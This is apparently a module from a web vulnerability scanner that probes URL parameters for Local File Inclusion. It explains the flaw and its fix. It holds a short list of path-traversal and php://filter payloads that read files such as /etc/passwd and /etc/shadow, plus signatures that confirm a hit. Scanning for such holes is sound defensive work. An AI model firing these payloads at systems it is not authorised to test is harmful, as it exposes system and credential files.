"""
LFI - Local File Inclusion
===========================
WHAT IS LFI?
  LFI allows attackers to include files from the server's filesystem via
  user-controlled input (e.g. ?page=../../../../etc/passwd)

FIX: Whitelist allowed file paths, never use user input directly in file paths.
REFERENCE: https://owasp.org/www-project-web-security-testing-guide/
"""

from modules.base import BaseScanner
from utils.helpers import safe_get, extract_params, inject_param

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",
    "for 16-bit app support",
    "127.0.0.1   localhost",
]


class LFIScanner(BaseScanner):
    NAME = "LFI Scanner"

    def run(self):
        self.log("Testing for Local File Inclusion...")
        params = extract_params(self.target) or ["page", "file", "include", "path",
                                                  "template", "view", "doc", "document"]
        for payload in LFI_PAYLOADS:
            for param in params:
                test_url = inject_param(self.target, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                for sig in LFI_SIGNATURES:
                    if sig in resp.text:
                        self.add_finding(f"LFI confirmed! Param: {param} | Payload: {payload} | Sig: '{sig}'")
                        self.log(f"LFI via {param}", "vuln")
                        return self.result(True, f"LFI found via param '{param}'")

        return self.result(False, "No LFI indicators found")
